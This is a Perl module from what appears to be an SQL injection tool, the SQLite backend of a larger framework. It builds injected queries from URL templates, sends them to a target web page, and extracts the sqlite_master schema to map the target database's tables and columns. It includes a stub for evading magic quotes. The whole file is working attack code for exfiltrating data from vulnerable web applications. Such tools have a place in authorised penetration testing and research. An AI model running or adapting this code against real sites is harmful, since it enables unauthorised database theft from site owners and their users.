package isr_sqlite;
use Data::Dump qw(dump);

#Author: Francisco Amato

#Tested in sqlite 3.3.17
my $version="3.3.17";

my @space=(' ',"\t",'/**/');
#Atributos publicos

#Private variable
@db_errors = (
	    {
             'code'  	=>'',
             'message'  =>'',
             'type'     =>0
            }	    
	    );

my @col_testpage=('SQL_LANGUAGE_SOURCE','SQL_LANGUAGE_YEAR','SQL_LANGUAGE_CONFORMANCE');
my $name_test="INFORMATION_SCHEMA.sql_languages";
my $coltype_testpage={
  SQL_LANGUAGE_SOURCE => "character",
  status          => "character",
  name          => "character",
  createdate    => "character"
};

my @col_dbschema=('\'$NODBNAME$\'','name','sql');
my $name_dbschema="sqlite_master";
my $name_dbschematail="type='table'";
my $coltype_dbschema={
  'a.TABLE_SCHEMA' => "character",
  'a.TABLE_NAME'          => "character",
  'a.COLUMN_NAME'          => "character",
  'a.DATA_TYPE'    => "character"
};


#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{error} = "testpage not implement\n"; #because don't have any other table than system table, all tables are depending of implementation
    $class->{dbsnames} = -1; # not implement    
#    $class->{testpage}=process_page($class,$name_test,$coltype_testpage,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,$coltype_dbschema,$name_dbschematail,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);
		    
}
sub process_schema{
    my $class =shift;
    my (@col) = @_;
    my @ncol;

    #parser create table command in system tables of sqlite							
    my @null;    
    foreach my $item (@col){

	$line=lc(@{$item}[2]);
	$line=~ /^create[ \t\n\r]+table[ \t\n\r]+[\s\w]+\(([\S\s\(\)]+)\)$/;

	my @list=split(/,/,$1);
	foreach my $colu (@list){    
    	    $colu=~/([\w]+) ([\w]+)/;
    	    my $colname= $1;
    	    my $coltype=$2;

	    my @z=@null;
	    push(@z,@{$item}[0]); #dbname
	    push(@z,@{$item}[1]); #table
	    push(@z,$colname); #colname
	    push(@z,$coltype); #coltype	    
	    push(@ncol,\@z);
#    	    print "colname = $colname, coltype= $coltype\n";
	}
    }
    return @ncol;
}
#Private method
sub process_page{

    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;
    my @ncol;

    #convert all to str

    #select
    $val = &getconcat(@col);

    $table=~ s/\$NODBNAME\$\.//gi;

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};

    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;    
    $datos=~ s/\<TAIL\>/$mtail/gi;

    #Magic quotes evasion
    print "db don't support evasion magic quotes\n" if $class->{conn}->{'magicquotes'};
#    $datos =~ s/'([^']+)'/magicquotes($1)/egi if $class->{conn}->{'magicquotes'}; #'
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}
sub magicquotes {
    my ($val) = @_;
    my @list= map { $_ = 'ASCII_CHAR('.$_.')' } unpack('C*', $val);
    my $return = &getconcat(@list);
    $return =~ s/\|\|'\[\_\_\]'\|\|/\|\|/gi;
    return $return;
}
		    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str=getvalue($items[0]);
        for (my $i=1;$i <=$can;$i++)
        {
                $str.= "||'[__]'||".getvalue($items[$i]);
        }
        return $str;
}

sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
